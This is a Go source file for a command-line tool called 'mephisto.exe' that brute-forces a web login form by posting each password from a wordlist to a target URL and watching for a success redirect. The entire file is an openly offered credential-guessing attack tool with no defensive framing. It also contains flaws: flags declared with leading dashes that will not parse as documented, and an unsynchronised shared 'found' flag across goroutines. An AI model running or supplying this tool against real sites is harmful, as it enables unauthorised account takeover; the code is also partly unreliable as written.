package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
)

func attemptLogin(targetURL, username, password, successRedirect string, wg *sync.WaitGroup, found *bool, foundPassword *string) {
	defer wg.Done()

	// If a password has already been found, skip further attempts
	if *found {
		return
	}

	client := &http.Client{}
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(fmt.Sprintf("username=%s&password=%s", username, password)))
	if err != nil {
		fmt.Printf("Error creating request for password '%s': %v\n", password, err)
		return
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error sending request for password '%s': %v\n", password, err)
		return
	}
	defer resp.Body.Close()

	// Check if the request was redirected to the success URL
	if resp.Request.URL.String() == successRedirect {
		fmt.Printf("KEY FOUND [%s]\n", password)
		*found = true
		*foundPassword = password
	}
}

func main() {
	// Define command-line flags
	username := flag.String("l", "", "Username (required)")
	passwordList := flag.String("P", "", "Password list file (required)")
	redirectURL := flag.String("--redirect", "", "Success redirect URL (required)")
	targetURL := flag.String("--url", "", "Target URL for brute-forcing (required)")
	flag.Parse()

	// Validate mandatory flags
	if *username == "" || *passwordList == "" || *targetURL == "" || *redirectURL == "" {
		fmt.Println("Usage: mephisto.exe -l username -P passwordlist --url target_url --redirect success_url")
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Open the password list file
	file, err := os.Open(*passwordList)
	if err != nil {
		fmt.Printf("Error opening password file: %v\n", err)
		return
	}
	defer file.Close()

	// Variables to track success
	var found bool
	var foundPassword string
	var wg sync.WaitGroup

	// Scan through the password list
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if found {
			break // Stop if a valid password is already found
		}

		password := scanner.Text()
		wg.Add(1)
		go attemptLogin(*targetURL, *username, password, *redirectURL, &wg, &found, &foundPassword)
	}

	wg.Wait() // Wait for all goroutines to complete

	if scanner.Err() != nil {
		fmt.Printf("Error reading password file: %v\n", scanner.Err())
	}

	// Final result
	if found {
		fmt.Printf("Password successfully found: [%s]\n", foundPassword)
	} else {
		fmt.Println("KEY NOT FOUND")
	}
}
